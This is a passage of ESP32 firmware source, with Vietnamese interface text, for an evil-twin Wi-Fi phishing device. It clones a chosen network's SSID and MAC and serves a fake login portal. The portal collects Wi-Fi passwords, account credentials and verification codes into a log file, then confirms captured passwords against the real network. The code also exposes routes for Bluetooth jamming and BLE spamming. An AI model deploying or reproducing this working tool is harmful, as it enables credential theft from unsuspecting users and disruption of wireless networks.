    esp_wifi_deinit();
    esp_wifi_disconnect();
    spammer_running = true;
    currentTypeIndex = 0; 
}

void toggleSpammer(AsyncWebServerRequest *request) {
    String modes = "";
    if (request->hasParam("modes")) modes = request->getParam("modes")->value();
    startSpammer(modes);
    request->send(200, "text/plain", "Spammer Started with modes: " + modes);
}

void checkAndCreateConfig() {
	if (!LittleFS.exists("/config.json")) {
		StaticJsonDocument<512> doc;
		doc["lang"] = "0";
		doc["status"] = "0";
		doc["check"] = "0";
		doc["apssid"] = "CHOMTV";
		doc["appass"] = "@@@@2222";
		doc["hiddenssid"] = "0";
		doc["html"] = "index.html";
		doc["targetssid"] = "CHOMTV";
		doc["fakessid"] = "CHOMTV";
		doc["mac"] = "";
		doc["channel"] = "";
		File file = LittleFS.open("/config.json", "w");
		if (file) {
			serializeJson(doc, file);
			file.close();
		}
	} else {
		File file = LittleFS.open("/config.json", "r");
		if (file) {
			StaticJsonDocument<512> doc;
			DeserializationError error = deserializeJson(doc, file);
			file.close();           
			if (error) {
				return;
			}
			if (!doc.containsKey("lang") || doc["lang"].as<String>() == "") {
				doc["lang"] = "0";
			}
			if (!doc.containsKey("status") || doc["status"].as<String>() == "") {
				doc["status"] = "0";
			}
			if (!doc.containsKey("check") || doc["check"].as<String>() == "") {
				doc["check"] = "0";
			}
			if (!doc.containsKey("apssid") || doc["apssid"].as<String>() == "") {
				doc["apssid"] = "CHOMTV";
			}
			if (!doc.containsKey("appass") || doc["appass"].as<String>() == "") {
				doc["appass"] = "@@@@2222";
			}
			if (!doc.containsKey("hiddenssid") || doc["hiddenssid"].as<String>() == "") {
				doc["hiddenssid"] = "0";
			}
			if (!doc.containsKey("html") || doc["html"].as<String>() == "") {
				doc["html"] = "index.html";
			}
			if (!doc.containsKey("targetssid") || doc["targetssid"].as<String>() == "") {
				doc["targetssid"] = "CHOMTV";
			}
			if (!doc.containsKey("fakessid") || doc["fakessid"].as<String>() == "") {
				doc["fakessid"] = "CHOMTV";
			}
			if (!doc.containsKey("mac") || doc["targetssid"].as<String>() == "") {
				doc["mac"] = "";
			}
			if (!doc.containsKey("channel") || doc["fakessid"].as<String>() == "") {
				doc["channel"] = "";
			}
			file = LittleFS.open("/config.json", "w");
			if (file) {
				serializeJson(doc, file);
				file.close();
			}
		}
	}
}

String readFromFile(const char* path) {
	File file = LittleFS.open(path, "r");
	if (!file) return "";
	String data = file.readString();
	file.close();
	return data;
}

void savePosted(const char* path, const String& data) {
	File file = LittleFS.open(path, "a");  
	if (file) {
		file.println(data); 
		file.close();
	}
}

void Posted(AsyncWebServerRequest *request) {
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	AP_PASS = loadFromConfig("appass").isEmpty() ? "@@@@2222" : loadFromConfig("appass");
	Target_SSID = loadFromConfig("targetssid").isEmpty() ? AP_SSID : loadFromConfig("targetssid");
	if (request->hasParam("t", true) && request->hasParam("m", true)) {
		String user = request->getParam("t", true)->value();
		String pass = request->getParam("m", true)->value();
		if (pass == AP_PASS) {
			handleStop(request);
			return;
		}
		String combined = "[info]" + user + "[" + pass + "]";
		savePosted("/pass.txt", combined);
		request->send(200, "text/html", header_target(CHECK_TITLE) + R"(
			<form action='/post' method='post' onsubmit='return validateForm()'>
				<label>)" + L("VERIFICATION", "Nhập mã xác thực") + R"(</label><br>
				<i>)" + L("INFOVERIFICATION", "Mã xác thực được gửi qua email hoặc số điện thoại bạn đã đăng ký tài khoản.") + R"(</i>
				<input type='text' id='text' name='c' placeholder=')" + L("VERIFICATIONCODE", "Mã xác thực") + R"('>
				<input class='btn-primary' type='submit' value=')" + L("VERIFY", "Xác thực") + R"('>
			</form>
			<script>
				function validateForm() {
					var text = document.getElementById('text').value;
					if (text.length < 1) {
						alert(')" + L("PLEASEENTERVERIFY", "Vui lòng nhập mã xác thực!") + R"(');
						return false;
					}
					return true;
				}
			</script>
			</div></body></html>)");
		return;
	} else if (request->hasParam("c", true)) {
		String code = request->getParam("c", true)->value();
		savePosted("/pass.txt", "(" + code + ")");
		request->send(200, "text/html", header_target(CHECK_TITLE) + L("VERIFYING", "Đang xác thực...") + R"(<a href='/'>)" + L("CONNECTNOW", "Kết nối ngay") + R"(</a></div></body></html>)");
		return;
	} else if (request->hasParam("m", true)) {
		String pass = request->getParam("m", true)->value();
		if (pass == AP_PASS) {
			handleStop(request);
			return;
		}
		String combined = "[wifi]" + Target_SSID + "[" + pass + "]";
		savePosted("/pass.txt", combined);
		if (WiFi.softAPSSID() == AP_SSID) {
			savePosted("/pass.txt", "(test)");
			request->send(200, "text/html", header_target(CHECK_TITLE) + L("PASSWORDSAVED", "Đã lưu mật khẩu vào file pass.txt...") + R"(<a href='/'>)" + L("BACK", "Trở về") + R"(</a></div></body></html>)");
			return;
		}
		request->send(200, "text/html", header_target(CHECK_TITLE) + R"(
			<script>
				setTimeout(() => window.location.href = '/status', 100);
			</script></head><body>
			<h3>)" + L("CONNECTING", "Đang kết nối Wi-Fi...") + R"(</h3>
			<p>)" + L("PLEASEWAIT", "Vui lòng chờ...") + R"(</p>
			</div></body></html>)");
		WiFi.disconnect();
		delay(500);			
		if (!waiting && loadFromConfig("check") == "1") {
			digitalWrite(PAUSE_PIN, HIGH);
			delay(100);
			digitalWrite(PAUSE_PIN, LOW);
			waiting = true;  
			wifiChecked = false; 
			startTime = millis();
		}
		WiFi.begin(Target_SSID.c_str(), pass.c_str());
	} else {
		request->send(200, "text/html", header_target(CHECK_TITLE) + L("HTMLERROR", "Lỗi File html!") + R"(</div></body></html>)");
	}
}

void handleCheckWiFi(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != Fake_SSID) {
		handleIndex(request);
		return;
	}
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	if (WiFi.status() == WL_CONNECTED) {
		savePosted("/pass.txt", "(ok)");
		request->send(200, "text/plain", L("SUCCESS", "Kết nối thành công..."));
		return;
	} else {
		savePosted("/pass.txt", "(no)");
		if (loadFromConfig("check") == "1") {
			digitalWrite(START_PIN, HIGH);
			delay(100);
			digitalWrite(START_PIN, LOW);
			wifiChecked = true; 
			waiting = false; 
		} 		
		String message = String(L("FAILURE", "Kết nối thất bại...")) + " " + L("PLEASE", "Vui lòng thử lại.");
		request->send(200, "text/plain", message);
	}
}

void handleStatusPage(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != Fake_SSID) {
		handleIndex(request);
		return;
	}
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	AP_SSID = loadFromConfig("apssid").isEmpty() ? "CHOMTV" : loadFromConfig("apssid");
	String stopUrl = "/stop_" + AP_SSID;
	String response = header_target(CHECK_TITLE) + R"(
		<script>
			function checkStatus() {
				fetch('/check')
					.then(response => response.text())
					.then(data => {
						document.getElementById('status').innerHTML = data;
						if (data.includes(')" + L("SUCCESS", "Kết nối thành công...") + R"(')) {
							setTimeout(() => window.location.href = ')" + stopUrl + R"(', 100);
						}
						if (data.includes(')" + L("FAILURE", "Kết nối thất bại...") + R"(')) {
							setTimeout(() => window.location.href = '/', 3000);
						}
					});
			}
			setInterval(checkStatus, 15000);
		</script></head><body>
		<h3>)" + L("CONNECTING", "Đang kết nối Wi-Fi...") + R"(</h3>
		<p id='status'>)" + L("CHECKING", "Đang kiểm tra...Vui lòng đợi giây lát.") + R"(</p>
		</div></body></html>)";
	request->send(200, "text/html", response);
}

void saveToConfig(const char* key, String value) {
	String currentValue = loadFromConfig(key);
	if (value != currentValue) {
		StaticJsonDocument<200> doc;
		File file = LittleFS.open("/config.json", "r");
		if (file) {
			DeserializationError error = deserializeJson(doc, file);
			file.close();
			if (error) {
				return;
			}
		}
		doc[key] = value;  
		file = LittleFS.open("/config.json", "w");
		if (file) {
			serializeJson(doc, file);  
			file.close();
		}
	}
}

String loadFromConfig(const char* key) {
	File file = LittleFS.open("/config.json", "r");
	if (!file) return AP_SSID; 
	String jsonStr = file.readString();
	file.close();
	StaticJsonDocument<200> doc;
	DeserializationError error = deserializeJson(doc, jsonStr);
	if (error) return AP_SSID; 
	return doc[key].as<String>(); 
}

void handleSaveConfig(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) {
		htmltarget(request);
		return;
	}
	String apssid = request->arg("apssid"); 
	String appass = request->arg("appass");
	String hiddenSSID = request->hasArg("hidden") ? "1" : "0";
	String currentLang = request->arg("aplang");
	if (apssid != "") {
		saveToConfig("apssid", apssid);  
	}
	if (appass != "") {
		saveToConfig("appass", appass); 
	}
	saveToConfig("hiddenssid", hiddenSSID);
	saveToConfig("lang", currentLang);
	request->redirect("/");
}

void Target_SSID_page(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) return htmltarget(request);
	Target_SSID = loadFromConfig("targetssid").isEmpty() ? AP_SSID : loadFromConfig("targetssid");
	Fake_SSID = loadFromConfig("fakessid").isEmpty() ? AP_SSID : loadFromConfig("fakessid");
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	String pageContent = header(SSID_TITLE) + R"(
		<form action='/posttargetssid' method='post'>
			<label>)" + L("TARGETWIFI", "Tên Wi-F mục tiêu") + R"(:</label>
			<input type='text' id='target_ssid' name='t' placeholder=')" + Target_SSID + R"(' oninput='syncSSID()'>
			<label>)" + L("EVILTWINWIFI", "Tên Wi-Fi Evil-Twin") + R"(:</label>
			<input type='text' id='fake_ssid' name='f' placeholder=')" + Fake_SSID + R"('>
			<input class='btn-primary' type='submit' value=')" + L("CHANGE1", "Thay đổi") + R"('>
		</form>
		<h3>)" + L("LISTWIFI", "Danh sách Wi-Fi xung quanh") + R"(:</h3>
		<p id='scanStatus'>)" + L("LOADING", "Đang tải...") + R"(</p>
		<table id='wifiTable'>
			<thead><tr><th>SSID</th><th>RSSI</th><th>)" + L("SELECT", "Chọn") + R"(</th></tr></thead>
			<tbody id='wifiBody'></tbody>
		</table>
		<button class='btn-primary' onclick='scanWiFi()'>🔄 )" + L("RESCAN", "Quét lại") + R"(</button>
		<br><br><a href='/'>)" + L("BACK", "Trở về") + R"(</a>
		<script>
			function syncSSID() { document.getElementById('fake_ssid').value = document.getElementById('target_ssid').value; }
			function scanWiFi() {
				document.getElementById('scanStatus').innerText = ')" + L("SCANNING", "Đang quét...") + R"(';
				fetch('/wifi_scan')
					.then(response => response.text())
					.then(data => {
						if (data.includes('Scanning')) return setTimeout(scanWiFi, 2000);
						let networks = JSON.parse(data), tbody = document.getElementById('wifiBody');
						tbody.innerHTML = '';
						networks.forEach(n => {
							tbody.innerHTML += '<tr><td>' + n.ssid + '</td><td>' + n.rssi + ' dB</td><td><button onclick=\"selectSSID(\'' + n.ssid + '\', \'' + n.mac + '\', ' + n.channel + ')\">)" + L("SELECT", "Chọn") + R"(</button></td></tr>';
						});
						document.getElementById('scanStatus').innerText = ')" + L("SCANCOMPLETED", "Quét xong!") + R"(';
					})
					.catch(() => document.getElementById('scanStatus').innerText = ')" + L("SCANERROR", "Lỗi quét Wi-Fi!") + R"(');
			}
			function selectSSID(ssid, mac, channel) {
				document.getElementById('target_ssid').value = ssid;
				document.getElementById('fake_ssid').value = ssid;
				fetch('/save_target', {
					method: 'POST',
					headers: { 'Content-Type': 'application/json' },
					body: JSON.stringify({ targetssid: ssid, mac: mac, channel: channel })
				}).then(resp => resp.text()).then(msg => alert(msg));
			}
			scanWiFi();
		</script></div></body></html>)";
	request->send(200, "text/html", pageContent);
}

bool compareWiFi(const WiFiNetwork &a, const WiFiNetwork &b) {
	return a.rssi > b.rssi;
}

void handleWiFiScan(AsyncWebServerRequest *request) {
	int scanStatus = WiFi.scanComplete();
	if (scanStatus == WIFI_SCAN_RUNNING) {
		request->send(200, "text/plain", "Scanning...");
		return;
	}
	if (scanStatus >= 0) {
		std::vector<WiFiNetwork> networks;
		DynamicJsonDocument json(2048);
		for (int i = 0; i < scanStatus; i++) {
			WiFiNetwork net;
			net.ssid = WiFi.SSID(i);
			net.rssi = WiFi.RSSI(i);
			uint8_t *bssid = WiFi.BSSID(i);
			char macStr[18];
			sprintf(macStr, "%02X:%02X:%02X:%02X:%02X:%02X", 
				bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5]);
			net.mac = String(macStr);
			net.channel = WiFi.channel(i);
			networks.push_back(net);
		}
		std::sort(networks.begin(), networks.end(), compareWiFi);
		for (const auto &net : networks) {
			JsonObject obj = json.createNestedObject();
			obj["ssid"] = net.ssid;
			obj["rssi"] = net.rssi;
			obj["mac"] = net.mac;
			obj["channel"] = net.channel;
		}
		WiFi.scanDelete();
		String response;
		serializeJson(json, response);
		request->send(200, "application/json", response);
	} else {
		WiFi.scanNetworks(true, false);
		request->send(200, "text/plain", "Scanning started...");
	}
}

void handleSaveTarget(AsyncWebServerRequest *request, uint8_t *data, size_t len, size_t index, size_t total) {
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	DynamicJsonDocument json(512);
	deserializeJson(json, (char*)data);
	String newTarget_SSID = json["targetssid"];
	String mac = json["mac"];
	String channel = json["channel"];
	DynamicJsonDocument configJson(1024);
	configJson["targetssid"] = newTarget_SSID;
	configJson["fakessid"] = newTarget_SSID;
	configJson["mac"] = mac;
	configJson["channel"] = channel;
	if (newTarget_SSID.length() > 0) {
		saveToConfig("targetssid", newTarget_SSID);
		saveToConfig("fakessid", newTarget_SSID);
	}
	if (mac.length() > 0) {
		saveToConfig("mac", mac);
	}
	if (channel.length() > 0) {
		saveToConfig("channel", channel);
	}
    request->send(200, "text/plain", String(L("SELECTED", "Đã chọn")) + "!");
}

void Posted_Target_SSID(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) {
		htmltarget(request);
		return;
	}
	String newFake_SSID = request->arg("f");
	String newTarget_SSID = request->arg("t");
	if (newFake_SSID.length() > 0) {
		saveToConfig("fakessid", newFake_SSID);
	}
	if (newTarget_SSID.length() > 0) {
		saveToConfig("targetssid", newTarget_SSID);
	}
	request->redirect("/targetssid");
}

String humanReadableSize(const size_t bytes) {
	if (bytes < 1024) return String(bytes) + " B";
	else if (bytes < (1024 * 1024)) return String(bytes / 1024.0) + " KB";
	else if (bytes < (1024 * 1024 * 1024)) return String(bytes / 1024.0 / 1024.0) + " MB";
	else return String(bytes / 1024.0 / 1024.0 / 1024.0) + " GB";
}

String getFileManagerHTML(const String& fileList, const String& freeStorage, 
                          const String& usedStorage, const String& totalStorage) {
    if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
    String html = R"(
        <h3>)" + String(L("FILEMANAGEMENT", "Quản lý tập tin")) + String(" ESP32") + R"(</h3>
        <p>Free <span id='freeLittleFS'>)" + freeStorage + R"(</span> | 
        Used <span id='usedLittleFS'>)" + usedStorage + R"(</span> | 
        Total <span id='totalLittleFS'>)" + totalStorage + R"(</span></p>
        <ul style='padding: 0;'>)" + fileList + R"(</ul>
        <div id='status'>)" + L("SELECTFILEUPLOAD", "Hãy chọn tập tin tải lên...") + R"(</div>
        <form id='uploadForm' enctype='multipart/form-data'>
            <input type='file' id='fileInput' name='files' multiple>
            <input class='btn-primary' type='submit' value=')" + L("UPLOAD", "Tải lên") + R"('>
        </form>
        <br><a href='/'>)" + L("BACK", "Trở về") + R"(</a>
        <script>
            document.getElementById('uploadForm').onsubmit = async function(e) {
                e.preventDefault();
                let fileInput = document.getElementById('fileInput');
                let status = document.getElementById('status');
                if (fileInput.files.length === 0) {
                    status.innerText = ')" + L("NOSELECT", "Chưa chọn tập tin...") + R"(';
                    return;
                }
                let freeStorageText = document.getElementById('freeLittleFS').innerText;
                let freeStorage = parseFloat(freeStorageText) * (freeStorageText.includes('KB') ? 1024 : 
                                                                freeStorageText.includes('MB') ? 1024 * 1024 : 
                                                                freeStorageText.includes('GB') ? 1024 * 1024 * 1024 : 1);
                let totalSize = 0;
                let emptyFiles = [];
                for (let i = 0; i < fileInput.files.length; i++) {
                    let file = fileInput.files[i];
                    totalSize += file.size;
                    if (file.size === 0) emptyFiles.push(file.name);
                }
                if (emptyFiles.length > 0) {
                    status.innerText = ')" + L("EMPTYFILEUPLOAD", "Tập tin rỗng") + ": " + R"(' + emptyFiles.join(', ');
                    return;
                }
                if (totalSize > freeStorage) {
                    status.innerText = ')" + L("NOTENOUGH", "Không đủ dung lượng! Cần: ") + R"(' + (totalSize / 1024) + ' KB, )" + L("FREE", "Còn: ") + R"(' + freeStorageText;
                    return;
                }
                let formData = new FormData();
                for (let i = 0; i < fileInput.files.length; i++) {
                    formData.append('files', fileInput.files[i]);
                }
                status.innerText = ')" + L("UPLOADING", "Đang tải lên...") + R"(';
                await fetch('/upload', { method: 'POST', body: formData });
                let interval = setInterval(async () => {
                    let uploadStatus = await (await fetch('/upload-status')).text();
                    status.innerText = uploadStatus;
                    if (!uploadStatus.includes('Uploading') && uploadStatus.length > 0) {
                        clearInterval(interval);
                        if (!uploadStatus.includes('Error')) {
                            setTimeout(() => location.reload(), 2000);
                        }
                    }
                }, 1000);
            };
            window.onload = function() {
                let params = new URLSearchParams(window.location.search);
                if (params.has('uploaded')) {
                    document.getElementById('fileInput').value = '';
                    history.replaceState(null, '', '/files');
                }
                document.getElementById('fileInput').value = '';
            };
        </script>)";
    return html;
}

String listFiles(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) {
		htmltarget(request);
		return "";
	}
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	String freeStorage, usedStorage, totalStorage, fileList = "";
	freeStorage = humanReadableSize(LittleFS.totalBytes() - LittleFS.usedBytes());
	usedStorage = humanReadableSize(LittleFS.usedBytes());
	totalStorage = humanReadableSize(LittleFS.totalBytes());
	File root = LittleFS.open("/");
	if (!root || !root.isDirectory()) {
		request->send(200, "text/html", "Lỗi mở thư mục!");
		return "";
    }
	File file = root.openNextFile();
	while (file) {
		String fileName = file.name();
		if (!fileName.startsWith("/")) fileName = "/" + fileName;
		fileList += "<li><a class='truncate' href='/view?file=" + fileName + "'>" + fileName + "</a> "
                 + "(" + humanReadableSize(file.size()) + ")"
                 + "<ol>";
		if (fileName.endsWith(".html")) fileList += " <a href='/sethtml?file=" + fileName + "'>[HTML]</a>";
		fileList += "<a href='/download?file=" + fileName + "'>[✓]</a> "
                 + "<a href='/delete?file=" + fileName + "' onclick='return confirm(\""+ L("DELETEFILES", "Xóa tập tin?") +"\")'>[✗]</a>"
                 + "</ol></li>";
		file = root.openNextFile();
	}
	root.close();
	String html = header(FILES_TITLE) + getFileManagerHTML(fileList, freeStorage, usedStorage, totalStorage) + R"(</div></body></html>)";
	request->send(200, "text/html", html);
	return "";
}

void handleViewFile(AsyncWebServerRequest *request) {
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
    if (WiFi.softAPSSID() != AP_SSID) {
        htmltarget(request);
        return;
    }
    String path = request->arg("file");
    if (!path.startsWith("/")) {
        path = "/" + path;
    }
    if (!LittleFS.exists(path)) {
        request->send(404, "text/html", header(FILES_TITLE) + "Tập không tồn tại...<a href='/files'>" + L("BACK", "Trở về") + "</a></div></body></html>");
        return;
    }   
    File file = LittleFS.open(path, "r");
    if (!file) {
        request->send(500, "text/plain", "Lỗi mở file!");
        return;
    }    
    AsyncWebServerResponse *response = request->beginResponse(LittleFS, path, "text/html");
    request->send(response);
}

void handleDownload(AsyncWebServerRequest *request) {
	if (WiFi.softAPSSID() != AP_SSID) {
		htmltarget(request);
		return;
	}     
	String path = request->arg("file"); 
	File file = LittleFS.open(path, "r");
	if (!file) {
		request->send(404, "text/plain", "File không tồn tại.");
		return;
	}
	AsyncWebServerResponse *response = request->beginResponse(LittleFS, path, "application/octet-stream");
	response->addHeader("Content-Disposition", "attachment; filename=" + path.substring(1)); 
	request->send(response);
	file.close();
}

void handleDelete(AsyncWebServerRequest *request) {
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	if (WiFi.softAPSSID() != AP_SSID) {
		htmltarget(request);
		return;
	}
	String path = request->arg("file");
	if (LittleFS.exists(path)) {
		LittleFS.remove(path);
		request->redirect("/files");
	} else {
		request->send(404, "text/plain", header(FILES_TITLE) + "Không tìm thấy tập tin...<a href='/files'>" + L("BACK", "Trở về") + "</a></div></body></html>");
	}
}

void handleUpload(AsyncWebServerRequest *request, String filename, size_t index, uint8_t *data, size_t len, bool final) {
    if (WiFi.softAPSSID() != AP_SSID) {
        htmltarget(request);
        return;
    }
    static String currentFileName; 
    static int fileCount = 0;      
    static String uploadResults;    
    if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
    if (!index) { 
        if (filename.length() == 0) {
            Serial.println("Error: No file selected for upload");
            uploadStatus = String(L("EMPTYFILEUPLOAD", "Tập tin rỗng"));
            return;
        }
        currentFileName = filename;
        Serial.println("Upload Start: " + filename);
        size_t freeBytes;
        freeBytes = LittleFS.totalBytes() - LittleFS.usedBytes();
        request->_tempFile = LittleFS.open("/" + filename, "w");
        if (!request->_tempFile) {
            Serial.println("Error: Failed to open file for writing: " + filename);
            uploadStatus = String("Lỗi: Không thể mở file ") + filename;
            return;
        }
        fileCount++;
        uploadResults += String(L("UPLOADING", "TĐang tải lên...")) + ": " + filename + "...\n";
        uploadStatus = uploadResults;
    }
    if (request->_tempFile && len > 0) {
        request->_tempFile.write(data, len);
    }
    if (final) { 
        request->_tempFile.close();
        if (index + len == 0) {
            LittleFS.remove("/" + currentFileName); 
            uploadResults += String(L("EMPTYFILEUPLOAD", "Tập tin rỗng")) + ": " + currentFileName + "\n";
            uploadStatus = uploadResults;
            fileCount = 0; 
            uploadResults = "";
            return;
        }
        uploadResults += String("Tải lên thành công: ") + currentFileName + "\n";
        uploadStatus = uploadResults;
        Serial.println("Upload Complete: " + currentFileName);
        if (request->hasParam("files", true)) {
            auto *param = request->getParam("files", true);
            if (fileCount >= param->size()) {
                uploadStatus = uploadResults + String(L("DONE", "Xong..."));
                fileCount = 0;
                uploadResults = "";
                request->redirect("/files?uploaded=true");
            }
        }
    }
}

void handleSetHtmlPage(AsyncWebServerRequest *request) {
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	if (WiFi.softAPSSID() != AP_SSID) {
		htmltarget(request);
		return;
	}
	String fileName = request->arg("file");
	if (!LittleFS.exists(fileName)) {
		request->send(404, "text/html", header(FILES_TITLE) + "Tập tin không tồn tại...<a href='/files'>" + L("BACK", "Trở về") + "</a></div></body></html>");
		return;
	}
	StaticJsonDocument<200> doc;
	File file = LittleFS.open("/config.json", "r");
	deserializeJson(doc, file ? file.readString() : "{}");
	file.close();
	doc["html"] = fileName;
	file = LittleFS.open("/config.json", "w");
	serializeJson(doc, file);
	file.close();
	request->send(200, "text/html", header(FILES_TITLE) + String(L("SELECTED", "Đã chọn")) + " " + fileName + "!<a href='/files'>" + L("BACK", "Trở về") + "</a></div></body></html>");
}

void htmltarget(AsyncWebServerRequest *request) {
	if (getCurrentLang() == "1") {
		loadLangIfExist("/lang.json");
	} else {
		langDict.clear();
	}
	String htmlFile = loadFromConfig("html");
	if (!LittleFS.exists(htmlFile)) {
		request->send(404, "text/html", header(MAIN_TITLE) + String(L("HTMLNOTEXIST", "Lỗi: Tập tin HTML không tồn tại...")) + "<a href='/'>" + L("BACK", "Trở về") + "</a></div></body></html>");
		return;
	}
	request->send(LittleFS, htmlFile, "text/html");
}

void checkResetButton() {
	static unsigned long buttonPressTime = 0;
	if (digitalRead(RESET_BUTTON_PIN) == LOW) { 
		digitalWrite(BUILTIN_LED, HIGH);		
		if (buttonPressTime == 0) {
			buttonPressTime = millis(); 
		}        
		if (millis() - buttonPressTime >= RESET_HOLD_TIME) {
			LittleFS.remove("/config.json"); 
			startBlinking();
		}        
	} else { 
		buttonPressTime = 0; 
	}
}

void handleStop(AsyncWebServerRequest *request) {
	saveToConfig("status", "0");
	digitalWrite(TRIGGER_PIN, HIGH);
	delay(100);
	digitalWrite(TRIGGER_PIN, LOW);
	saveToConfig("stop", "0");
	ESP.restart();
}

void IRAM_ATTR handleButton() {
	if (millis() - lastDebounceTime > debounceDelay) {
		buttonPressed = true;
		lastDebounceTime = millis();
	}
}

void setup() {
	Serial.begin(115200);
	if (!LittleFS.begin(true)) {
		Serial.println("LittleFS mount failed");
		return;
	}
	pinMode(RESET_BUTTON_PIN, INPUT_PULLUP);
	pinMode(TRIGGER_PIN, OUTPUT);
	pinMode(PAUSE_PIN, OUTPUT);
	pinMode(START_PIN, OUTPUT);
	pinMode(OFF_BLUE_PIN, INPUT);
	attachInterrupt(digitalPinToInterrupt(OFF_BLUE_PIN), handleButton, RISING);
	pinMode(ON_BLUE_PIN, INPUT);
	pinMode(BUILTIN_LED, OUTPUT);
	digitalWrite(RESET_BUTTON_PIN, HIGH);
	digitalWrite(BUILTIN_LED, HIGH);
	digitalWrite(TRIGGER_PIN, LOW);
	digitalWrite(PAUSE_PIN, LOW);
	digitalWrite(START_PIN, LOW);
	checkAndCreateConfig();
	delay(1000);
	WiFi.mode(WIFI_AP_STA);
	WiFi.softAPConfig(APIP, APIP, SUBNET);
	AP_SSID = loadFromConfig("apssid");
	if (AP_SSID.isEmpty()) AP_SSID = "CHOMTV";
	AP_PASS = loadFromConfig("appass");
	if (AP_PASS.isEmpty()) AP_PASS = "@@@@2222";
	Fake_SSID = loadFromConfig("fakessid");
	if (Fake_SSID.isEmpty()) Fake_SSID = AP_SSID;
	bool hidden = (loadFromConfig("hiddenssid") == "1");
	if (loadFromConfig("status") == "0") WiFi.softAP(AP_SSID.c_str(), AP_PASS.c_str(), 1, hidden);
	if (loadFromConfig("status") == "1") {
		String macAddress = loadFromConfig("mac");
		if (!macAddress.isEmpty()) {
			if (macAddress.length() == 17) {
				uint8_t mac[6];
				sscanf(macAddress.c_str(), "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
				mac[5] = random(0x00, 0xFF);
				char newMacStr[18];
				sprintf(newMacStr, "%02X:%02X:%02X:%02X:%02X:%02X", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
				esp_wifi_set_mac(WIFI_IF_AP, mac);
			}
		}
		String channelStr = loadFromConfig("channel"); 
		int channel = channelStr.toInt();
		if (channel <= 0 || channel > 13) {
			channel = random(1, 14);
		}
		WiFi.softAP(Fake_SSID.c_str(), NULL, channel);
	}
	dnsServer.start();
	hp.begin();
	vp.begin();
	server.on("/logo.png", HTTP_GET, [](AsyncWebServerRequest *request){
		request->send(200, "image/png", logo_png, logo_png_len);
	});
	server.on("/CurrentTarget", HTTP_GET, [](AsyncWebServerRequest *request) {
		Fake_SSID = loadFromConfig("fakessid");
		if (Fake_SSID.isEmpty()) Fake_SSID = AP_SSID;
		request->send(200, "text/plain", (Fake_SSID == "") ? WiFi.softAPSSID() : Fake_SSID);
	});
	server.on("/sys_reset", HTTP_GET, [](AsyncWebServerRequest *request) {
		ESP.restart();
	});
	server.on("/saveconfig", HTTP_POST, [](AsyncWebServerRequest *request) {handleSaveConfig(request); startBlinking(); });
	server.on("/post", HTTP_POST, [](AsyncWebServerRequest *request) { Posted(request); startBlinking(); });
	server.on("/check", HTTP_GET, [](AsyncWebServerRequest *request) { handleCheckWiFi(request); });
	server.on("/status", HTTP_GET, [](AsyncWebServerRequest *request) { handleStatusPage(request); });
	server.on("/files", HTTP_GET, [](AsyncWebServerRequest *request) {listFiles(request);});
	server.on("/view", HTTP_GET, handleViewFile);
	server.on("/download", HTTP_GET, handleDownload);
	server.on("/upload", HTTP_POST, [](AsyncWebServerRequest *request){
		if (getCurrentLang() == "1") {
			loadLangIfExist("/lang.json");
		} else {
			langDict.clear();
		}
		uploadStatus = L("DONE", "Xong..."); 
	}, handleUpload);
	server.on("/upload-status", HTTP_GET, [](AsyncWebServerRequest *request){
		request->send(HTTP_POST, "text/plain", uploadStatus);
	});
	server.on("/delete", HTTP_GET, handleDelete);
	server.on("/html", HTTP_GET, htmltarget);
	server.on("/sethtml", HTTP_GET, handleSetHtmlPage);
	server.on("/help", HTTP_GET, helpPage);
	server.on("/blue", HTTP_GET, BluetoothJammer);
	server.on("/toggle_jammer", HTTP_GET, toggleJammer);
	server.on("/spam", HTTP_GET, BleSpammer);
	server.on("/toggle_spammer", HTTP_GET, toggleSpammer);
	server.on("/targetssid", HTTP_GET, [](AsyncWebServerRequest *request) {Target_SSID_page(request); });
	server.on("/wifi_scan", HTTP_GET, handleWiFiScan);
	server.on("/save_target", HTTP_POST, [](AsyncWebServerRequest *request) {}, NULL, handleSaveTarget);
	server.on("/posttargetssid", HTTP_POST, [](AsyncWebServerRequest *request) {Posted_Target_SSID(request); startBlinking(); });
	server.on("/pass", HTTP_GET, [](AsyncWebServerRequest *request) {
		if (WiFi.softAPSSID() != AP_SSID) {
			htmltarget(request);
			return;
		}
		String passData = readFromFile("/pass.txt");
		passData.replace("\n", "<br>"); 
		String html = "<!DOCTYPE HTML><html><head><meta charset='UTF-8'></head><body>" + passData + "</body></html>";
		request->send(HTTP_POST, "text/html", html);
	});
	server.on(("/" + AP_PASS).c_str(), HTTP_GET, [](AsyncWebServerRequest *request) {
		if (WiFi.softAPSSID() != Fake_SSID) {
			handleIndex(request);
			return;
		}
		String passData = readFromFile("/pass.txt");
		passData.replace("\n", "<br>"); 
		String html = "<!DOCTYPE HTML><html><head><meta charset='UTF-8'></head><body>" + passData + "</body></html>";
